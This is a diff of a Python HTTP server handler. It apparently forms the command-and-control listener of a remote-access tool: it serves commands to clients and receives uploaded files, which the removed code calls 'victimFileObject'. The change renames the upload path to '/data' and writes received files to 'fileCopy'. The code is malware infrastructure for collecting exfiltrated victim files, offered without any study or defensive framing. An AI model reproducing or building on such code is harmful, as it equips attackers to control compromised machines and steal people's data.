@@ -17,21 +17,22 @@ class MyGetRequestHandler(BaseHTTPRequestHandler):
         self.wfile.write(command.encode())
     
     def do_POST(self):
-        if self.path.endswith("/store"):
+        if self.path.endswith("/data"):
             try:
-                ctype,pdick = cgi.parse_header(self.headers.get("content-type"))
-                if ctype == "multipart/form-data":
-                    fs = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={"REQUEST_METHOD":"POST"})
+                contentType,data = cgi.parse_header(self.headers.get("Content-type"))
+                if contentType == "multipart/form-data":
+                   hold = cgi.FieldStorage(fp=self.rfile,headers= self.headers,environ={'REQUEST_METHOD':"POST"})
+                   with open("fileCopy","wb") as fileObject:
+                       fileObject.write(hold['file'].file.read())
+
+                   self.send_response(200)
+                   self.end_headers()
                 else:
-                    print("Unexpted POST request")
-                victimFileObject = fs["file"]
-                with open("newFile.mp4","wb") as fileObject:
-                    print("Writing File ..")
-                    fileObject.write(victimFileObject.file.read())
-                    self.send_response(200)
-                    self.end_headers()
-            except Exception as e:
-                print(e)
+                    print("POST Resquest Error")
+            except Exception as error:
+                print(error)   
+            return
+
         self.send_response(200)
         self.end_headers()
         length = int(self.headers["Content-length"])
